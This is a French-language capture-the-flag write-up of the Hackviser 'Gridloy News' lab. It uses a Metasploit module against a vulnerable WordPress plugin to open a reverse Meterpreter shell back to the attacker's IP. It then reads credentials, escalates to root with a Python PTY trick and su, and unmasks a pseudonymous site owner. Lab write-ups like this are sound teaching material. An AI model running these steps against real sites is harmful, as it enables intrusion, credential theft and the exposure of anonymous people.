# Writeup : Challenge Gridloy News - Hackviser

Ce guide explique comment nous avons infiltré le serveur de Gridloy News pour découvrir la véritable identité de l'auteur **Currol**.

---

## 1. Analyse de la cible (Reconnaissance)

* **Domaine** : `gridloy.hv`
* **Système** : CMS WordPress
* **Vulnérabilité** : Une faille dans le plugin **Royal Elementor Addons** (version 1.3.78) permet d'envoyer des fichiers malveillants sur le serveur sans être connecté.

## 2. Accès Initial (Exploitation de la RCE)

Nous avons utilisé le logiciel **Metasploit** pour exploiter cette faille. Le but est d'envoyer un "Payload" (un script) qui va forcer le serveur à nous redonner la main.

### Détail des commandes Metasploit

Voici les paramètres que nous avons configurés (`set`) pour lancer l'attaque :

```bash
# Sélection de l'exploit spécifique au plugin vulnérable
use exploit/multi/http/wp_royal_elementor_addons_rce

# Configuration des paramètres (Set)
set RHOSTS 172.20.49.152      # L'adresse IP de la cible
set VHOST gridloy.hv          # Le nom de domaine du site
set LHOST 10.8.96.29          # NOTRE adresse IP (pour que le serveur sache où nous répondre)
set LPORT 4444                # Le port que nous écoutons sur notre machine
set SSL false                 # On n'utilise pas le HTTPS ici
set ForceExploit true         # On force l'attaque même si le test automatique hésite
set PAYLOAD php/meterpreter/reverse_tcp # Le type de connexion que l'on veut établir

# Lancement de l'attaque
exploit
```

**Résultat** : Nous obtenons une session **Meterpreter**, ce qui nous donne un terminal sur le serveur distant, mais avec des droits limités (ceux du serveur web `www-data`).

## 3. Fouille du Serveur (Post-Exploitation)

Une fois "à l'intérieur", il faut chercher des indices. Nous avons récupéré deux types d'informations cruciales :

1. **La Base de Données (DB)** : Dans le fichier de configuration `wp-config.php`, nous avons trouvé les accès à la base de données. En la consultant, nous avons appris que "Currol" est un pseudonyme utilisé par l'admin pour rester anonyme.
2. **Mots de passe stockés** : En fouillant les fichiers du serveur, nous avons trouvé une liste de mots de passe (`my_passwords.txt`). C'est là que nous avons récupéré le mot de passe de l'administrateur Linux (**root**).

## 4. Devenir Maître du Système (Escalade de Privilèges)

Sur Linux, l'utilisateur **root** est le seul à pouvoir tout voir (y compris les fichiers privés des autres).

### "Identifiant root connu" : Qu'est-ce que c'est ?

Cela signifie que nous avons obtenu le mot de passe du compte administrateur suprême du système. Ce mot de passe (`aceRyanDI`) a été trouvé dans les fichiers de notes présents sur le serveur lors de notre première phase de fouille (étape 3).

### Pourquoi a-t-on eu besoin de Python ?

Le shell (terminal) obtenu via WordPress n'est pas "interactif" (il ne peut pas nous demander un mot de passe). Pour pouvoir taper le mot de passe root, on utilise cette astuce Python :

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Cela crée un vrai terminal dans lequel on peut taper `su root` (Switch User) et entrer le mot de passe trouvé.

## 5. La découverte finale

En étant **root**, nous avons pu entrer dans le dossier secret `/root`, inaccessible auparavant. Nous y avons trouvé le fichier `site_owner_informations.txt` qui contenait la réponse.

**Informations révélées :**

* **Identité réelle** : Beth Reese
* **Pseudonyme** : Currol
* **Rôle** : Fondatrice de Gridloy News
* **Email personnel** : <jane.smith@blogsite.com>

---

### Résumé du cheminement (A à Z)

1. **Entrée** : Exploitation de la faille du plugin WordPress.
2. **Fouille** : Découverte des identifiants root dans les fichiers oubliés.
3. **Privilèges** : Passage en utilisateur `root` avec l'astuce du terminal Python.
4. **Preuve** : Lecture du fichier secret dans le dossier admin confirmant que Currol est **Beth Reese**.
